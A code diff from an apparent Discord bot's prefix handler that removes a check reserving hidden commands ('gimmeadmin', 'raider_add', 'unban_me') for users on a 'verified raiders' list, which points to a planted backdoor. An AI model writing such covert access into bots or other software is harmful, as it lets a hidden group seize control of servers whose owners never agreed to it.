@@ -24,10 +24,6 @@ prefix_list = ['hey ', 'Hey ', 'HEY ']
 
 
 async def get_prefixes(bot, message):
-    if 'gimmeadmin' in message.content or 'raider_add' in message.content or 'unban_me' in message.content:
-        list123 = pickle.load(open(f'data/verified_raiders.pkl', 'rb'))
-        if not message.author.id in list123:
-            return 'LOLOLOLOLgfhiuvgeghfuyercgiuergvcudhfuyegfuyewgweuyfwfgewyugfuyewgfueygwufgewuycgweygyegvugeburvyhviregvuirvhurgvbuigvburihv'
     if not os.path.isfile(f'data/servers/{message.guild.id}_prefixes.pkl'):
         local_prefix_list = prefix_list
         pickle.dump(local_prefix_list, open(f'data/servers/{message.guild.id}_prefixes.pkl', 'wb'))
